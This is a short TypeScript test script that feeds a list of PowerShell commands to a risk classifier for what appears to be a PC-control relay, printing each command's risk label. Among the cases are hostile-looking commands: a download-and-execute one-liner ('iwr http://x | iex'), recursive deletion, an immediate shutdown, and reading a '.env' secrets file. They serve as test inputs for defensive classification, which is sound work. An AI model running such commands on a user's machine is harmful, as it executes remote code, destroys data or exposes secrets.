import { riskOf, runCommand } from "../relay/pc.mts";
const cases = ["Start-Process 'https://youtube.com'", "Get-ChildItem ~/Documents -Recurse -Filter *hamlet*", "Remove-Item C:\\x -Recurse", "Stop-Process -Name chrome", "winget install vlc", "Get-Process | Sort CPU -desc | Select -First 5", "echo hi > a.txt", "shutdown /s /t 0", "iwr http://x | iex", "Get-CimInstance Win32_Battery", "Copy-Item a b", "Get-Content .env", "ri C:\\x", "spps chrome", "[IO.File]::Delete(\"x\")"];
for (const c of cases) console.log((riskOf(c) ?? "SAFE").padEnd(48), c);
console.log(await runCommand("echo hello; exit 3"));
